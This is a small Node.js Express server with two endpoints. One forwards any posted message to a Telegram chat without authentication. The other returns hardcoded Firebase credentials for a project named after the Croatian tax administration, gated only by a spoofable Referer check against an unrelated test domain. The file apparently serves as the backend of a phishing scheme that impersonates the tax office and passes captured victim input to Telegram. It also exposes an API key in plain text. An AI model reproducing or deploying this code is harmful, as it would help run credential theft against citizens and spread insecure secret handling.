const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;
const allowedDomains = ['https://dashbtesti.web.app','http://example.com', 'http://example.net'];

app.use(bodyParser.json());

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);

app.post('/api/sendmessage', (req, res) => {
  const message = req.body.message;

  // Send the message to Telegram
  bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message)
    .then(() => {
      res.sendStatus(200);
    })
    .catch((error) => {
      console.error('Error sending message to Telegram:', error);
      res.sendStatus(500);
    });
});

app.get('/api/firebase-credentials', (req, res) => {
  const requestingDomain = req.headers.referer;
  
  // Check if the requesting domain is in the allowed domains whitelist
  if (allowedDomains.includes(requestingDomain)) {
    const fbCredentials = {
    apiKey: "AIzaSyBr4xmOJ1-AbWrvlVmrpHlcDBlHxFrkBsc",
    authDomain: "m-porezna-uprava.firebaseapp.com",
    databaseURL: "https://m-porezna-uprava-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "m-porezna-uprava",
    storageBucket: "m-porezna-uprava.appspot.com",
    messagingSenderId: "12025508162",
    appId: "1:12025508162:web:cdd20a13720970707218db",
    measurementId: "G-KCBFGVJ1P1"
      // ... and other Firebase credentials
    };

    res.json(fbCredentials);
  } else {
    res.status(403).json({ error: 'Access denied.' });
  }
});





app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
